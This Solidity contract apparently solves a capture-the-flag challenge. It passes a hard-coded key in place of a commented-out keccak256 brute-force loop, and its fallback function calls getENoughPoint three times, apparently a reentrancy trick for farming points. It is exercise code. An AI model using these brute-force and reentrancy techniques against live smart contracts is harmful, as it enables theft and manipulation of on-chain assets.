// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.13;

import "./IChallenge.sol";

contract Att {
    IChallenge challenge;

    constructor(address _challenge) {
        challenge = IChallenge(_challenge);
    }

    function bruteForce() external {
        // for (uint8 i = 0; i < 256; i++) {
        //     if (
        //         keccak256(abi.encode(i)) ==
        //         0x3a6357012c1a3ae0a17d304c9920310382d968ebcc4b1771f41c6b304205b570
        //     ) {
        challenge.passKey(33);
        return;
        //     }
        // }
        // revert("Key not found");
    }

    // function acc() public {
    //     challenge.getENoughPoint("Adekunle");
    // }

    function abc() public {
        challenge.addYourName();
    }

    fallback() external {
        for (uint i = 0; i < 3; i++) {
            challenge.getENoughPoint("Adekunle");
        }
    }
}
